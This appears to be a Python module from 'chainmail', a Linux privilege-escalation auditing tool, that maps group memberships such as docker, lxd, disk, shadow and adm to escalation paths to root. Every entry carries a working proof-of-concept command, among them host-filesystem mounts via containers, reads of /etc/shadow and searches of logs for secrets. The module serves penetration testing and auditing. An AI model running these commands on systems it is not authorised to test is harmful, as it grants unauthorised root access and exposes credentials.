"""Group-membership escalation knowledge.

Membership in certain groups grants capabilities that can be parlayed into
root. Individually, being in one of these groups is benign and linpeas may
just note it; chainmail treats each as a graph edge so it can compound with
other steps (e.g. you're not in `docker`, but a script you can write is run by
someone who is).

Each entry yields an edge ``group:<name> -> user:<target>`` (target defaults to
root) carrying a PoC verification command.
"""
from __future__ import annotations

from dataclasses import dataclass


@dataclass
class GroupEscalation:
    group: str
    target: str            # principal you become (usually "root")
    summary: str
    poc: str
    requires: str = ""     # extra condition worth noting


GROUP_ESCALATIONS: dict[str, GroupEscalation] = {
    "docker": GroupEscalation(
        group="docker", target="root",
        summary="Docker socket grants root: mount the host filesystem into a container.",
        poc="docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        requires="docker daemon reachable",
    ),
    "lxd": GroupEscalation(
        group="lxd", target="root",
        summary="lxd group can launch a privileged container with the host disk mounted.",
        poc=("lxc init alpine r -c security.privileged=true && "
             "lxc config device add r d disk source=/ path=/mnt/root recursive=true && "
             "lxc start r && lxc exec r /bin/sh"),
    ),
    "lxc": GroupEscalation(
        group="lxc", target="root",
        summary="lxc group can run privileged containers mounting the host filesystem.",
        poc="see lxd technique; init a privileged container with source=/ disk",
    ),
    "disk": GroupEscalation(
        group="disk", target="root",
        summary="disk group can read/write raw block devices -> read /etc/shadow or patch files.",
        poc="debugfs $(df / --output=source | tail -1)  # then: cat /etc/shadow",
    ),
    "shadow": GroupEscalation(
        group="shadow", target="root",
        summary="shadow group can read /etc/shadow; crack root's hash offline.",
        poc="cat /etc/shadow | grep '^root:'  # then hashcat/john offline",
    ),
    "adm": GroupEscalation(
        group="adm", target="root",
        summary="adm group reads system logs; harvest creds/tokens leaked in logs.",
        poc="grep -ri 'password\\|token\\|secret' /var/log 2>/dev/null",
        requires="depends on what leaks into logs",
    ),
    "sudo": GroupEscalation(
        group="sudo", target="root",
        summary="sudo group typically permits running commands as root (subject to sudoers).",
        poc="sudo -l   # confirm rights, then sudo /bin/sh",
        requires="valid password and permissive sudoers",
    ),
    "wheel": GroupEscalation(
        group="wheel", target="root",
        summary="wheel group is the sudo group on RHEL/Arch-family systems.",
        poc="sudo -l   # confirm rights, then sudo /bin/sh",
        requires="valid password and permissive sudoers",
    ),
    "video": GroupEscalation(
        group="video", target="root",
        summary="video group can read the framebuffer; capture on-screen secrets.",
        poc="cat /dev/fb0 > /tmp/screen.raw   # reconstruct with fbgrab",
        requires="something sensitive on screen",
    ),
    "root": GroupEscalation(
        group="root", target="root",
        summary="root group ownership of writable files/dirs is frequently abusable.",
        poc="look for root-group-writable scripts run by root (chainmail flags these)",
    ),
}


def lookup(group: str) -> GroupEscalation | None:
    return GROUP_ESCALATIONS.get(group)
